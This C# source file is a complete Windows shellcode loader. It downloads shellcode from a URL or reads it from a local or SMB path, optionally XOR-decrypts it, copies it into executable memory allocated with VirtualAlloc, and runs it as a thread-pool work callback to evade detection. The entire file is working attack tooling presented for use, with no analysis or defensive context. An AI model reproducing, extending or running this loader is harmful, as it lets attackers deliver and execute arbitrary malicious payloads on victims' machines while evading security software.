using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;

class Program
{
    // Define the constants for VirtualAlloc
    const uint MEM_COMMIT = 0x1000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    // Delegate (if using non-generic pattern).
    public delegate void WorkCallback(IntPtr instance, IntPtr context, IntPtr work);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr RtlMoveMemory(IntPtr dest, byte[] src, uint size);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThreadpoolWork(WorkCallback callback, IntPtr context, IntPtr environment);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern void SubmitThreadpoolWork(IntPtr ptpWork);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern void WaitForThreadpoolWorkCallbacks(IntPtr ptpWork, bool cancelPendingCallbacks);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern void CloseThreadpoolWork(IntPtr ptpWork);

    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: Program.exe [-r remote_url | local_path_or_SMB_path] [-k xor_key]");
            return;
        }

        string sourcePath = args[1];
        string xorKey = null;

        if (args.Length == 4 && args[2] == "-k")
        {
            xorKey = args[3];
        }

        byte[] shellcode;

        if (args[0] == "-r")
        {
            Console.WriteLine("[Info] Attempting to download shellcode from the provided URL.");
            shellcode = DownloadShellcodeFromUrl(sourcePath);
        }
        else
        {
            Console.WriteLine("[Info] Attempting to read shellcode from the provided file path.");
            shellcode = File.ReadAllBytes(sourcePath);
        }

        if (!string.IsNullOrEmpty(xorKey))
        {
            Console.WriteLine("[Info] Decrypting shellcode using the provided XOR key.");
            shellcode = DecryptShellcode(shellcode, xorKey);
        }

        if (shellcode == null || shellcode.Length == 0)
        {
            Console.WriteLine("[Failed] Failed to load or decrypt shellcode.");
            return;
        }
        else
        {
            Console.WriteLine("[Success] Shellcode loaded/decrypted successfully.");
        }

        IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (hAlloc == IntPtr.Zero)
        {
            Console.WriteLine($"[Failed] Memory allocation for shellcode failed. Error Code: {Marshal.GetLastWin32Error()}");
            return;
        }

        RtlMoveMemory(hAlloc, shellcode, (uint)shellcode.Length);

        IntPtr TPWork = CreateThreadpoolWork((WorkCallback)Marshal.GetDelegateForFunctionPointer(hAlloc, typeof(WorkCallback)), IntPtr.Zero, IntPtr.Zero);

        SubmitThreadpoolWork(TPWork);

        WaitForThreadpoolWorkCallbacks(TPWork, false);

        CloseThreadpoolWork(TPWork);
    }

    static byte[] DownloadShellcodeFromUrl(string url)
    {
        using (var httpClient = new System.Net.Http.HttpClient())
        {
            try
            {
                var byteArray = httpClient.GetByteArrayAsync(url).Result;
                if (byteArray != null && byteArray.Length > 0)
                {
                    Console.WriteLine("[Success] Shellcode downloaded successfully.");
                    return byteArray;
                }
                else
                {
                    Console.WriteLine("[Failed] Shellcode downloaded but the content is empty or null.");
                    return null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Failed] Downloading shellcode: {ex.Message}");
                return null;
            }
        }
    }

    static byte[] DecryptShellcode(byte[] encryptedShellcode, string xorKey)
    {
        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
        for (int i = 0; i < encryptedShellcode.Length; i++)
        {
            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
        }
        return decryptedShellcode;
    }
}
